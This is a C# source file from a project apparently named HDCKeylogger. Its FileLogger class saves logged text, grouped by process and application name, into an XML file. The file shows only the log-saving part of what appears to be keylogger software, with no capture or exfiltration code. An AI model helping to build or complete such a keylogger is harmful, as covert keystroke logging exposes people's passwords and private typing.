using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace HDCKeylogger.Logging
{
    public class FileLogger
    {
        public static void SaveLogfile(string logfilepath, Hashtable logData)
        {
            try
            {
                var writer = new StreamWriter(logfilepath, false);
                IDictionaryEnumerator element = logData.GetEnumerator();
                writer.Write("<?xml version=\"1.0\"?>");
                writer.Write("<ApplDetails>");

                while (element.MoveNext())
                {
                    writer.Write("<Apps_Log>");
                    writer.Write("<ProcessName>");
                    string processname = "<![CDATA[" +
                                         element.Key.ToString().Trim().Substring(0,
                                                                                 element.Key.ToString().Trim().
                                                                                     LastIndexOf("######")).Trim() +
                                         "]]>";
                    processname = processname.Replace("\0", "");
                    writer.Write(processname);
                    writer.Write("</ProcessName>");

                    writer.Write("<ApplicationName>");
                    string applname = "<![CDATA[" +
                                      element.Key.ToString().Trim().Substring(
                                          element.Key.ToString().Trim().LastIndexOf("######") + 6).Trim() + "]]>";
                    writer.Write(applname);
                    writer.Write("</ApplicationName>");
                    writer.Write("<LogData>");
                    string ldata = ("<![CDATA[" + element.Value.ToString().Trim() + "]]>").Replace("\0", "");
                    writer.Write(ldata);

                    writer.Write("</LogData>");
                    writer.Write("</Apps_Log>");
                }
                writer.Write("</ApplDetails>");
                writer.Flush();
                writer.Close();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
        }
    }
}
